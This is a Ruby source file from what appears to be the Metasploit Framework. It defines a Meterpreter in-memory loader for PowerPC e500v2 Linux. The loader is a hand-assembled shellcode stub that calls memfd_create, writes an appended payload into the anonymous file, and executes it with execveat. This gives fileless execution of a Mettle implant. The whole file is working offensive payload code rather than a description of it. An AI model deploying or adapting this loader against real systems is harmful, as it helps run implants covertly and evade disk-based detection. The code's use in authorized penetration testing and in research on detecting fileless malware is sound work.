#
# In memory loader used to execute Mettle ELF file.
# Compatible with Kernel Linux >= 3.17 (where memfd_create is introduced)
# Author: Martin Sutovsky <martin_sutovsky[at]rapid7.com>
# Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
#
# PPC64 conventions
# Syscall Offset: r0
# Return value: r3
# Return Address: lr
# Stack Pointer: r1
# Parameters: r3-r10

module Msf::Payload::Linux::Ppce500v2::MeterpreterLoader
  def in_memory_load(payload)
    in_memory_loader = [
      # jump to address 0x105c
      0x4800005c, # 0x1000:	b	0x105c	0x4800005c

      # move from link register (lr) to r15 
      0x7de802a6, # 0x1004:	mflr	r15	0x7de802a6

      # fd = memfd_create(NULL,MFD_CLOEXEC)
      0x39c00000, # 0x1008:	li	r14, 0	0x39c00000
      0x95c10000, # 0x100c:	stwu	r14, 0(r1)	0x95c10000
      0x7c230b78, # 0x1010:	mr	r3, r1	0x7c230b78
      0x38800000, # 0x1014:	li	r4, 0	0x38800000
      0x38000168, # 0x1018:	li	r0, 0x168	0x38000168
      0x44000002, # 0x101c:	sc		0x44000002
      # write(fd, payload length, payload pointer)

      0x7df07b78, # 0x1020:	mr	r16, r15	0x7df07b78
      0x7c711b78, # 0x1024:	mr	r17, r3	0x7c711b78
      0x80af0000, # 0x1028:	lwz	r5, 0(r15)	0x80af0000
      0x39ef0004, # 0x102c:	addi	r15, r15, 4	0x39ef0004
      0x7de47b78, # 0x1030:	mr	r4, r15	0x7de47b78
      0x38000004, # 0x1034:	li	r0, 4	0x38000004
      0x44000002, # 0x1038:	sc		0x44000002
      # execveat(fd, null,null,null, AT_EMPTY_PATH)

      0x7e238b78, # 0x103c:	mr	r3, r17	0x7e238b78
      0x95c10000, # 0x1040:	stwu	r14, 0(r1)	0x95c10000
      0x7c240b78, # 0x1044:	mr	r4, r1	0x7c240b78
      0x7c852278, # 0x1048:	xor	r5, r4, r4	0x7c852278
      0x7ca62a78, # 0x104c:	xor	r6, r5, r5	0x7ca62a78
      0x38e01000, # 0x1050:	li	r7, 0x1000	0x38e01000
      0x3800016a, # 0x1054:	li	r0, 0x16a	0x3800016a
      0x44000002, # 0x1058:	sc		0x44000002

      # jump back to adress 0x1004, store address following this instruction in link register (lr)
      0x4bffffa9, # 0x105c:	bl	0x1004	0x4bffffa9
      payload.length
    ].pack('N*')
    in_memory_loader
  end

end
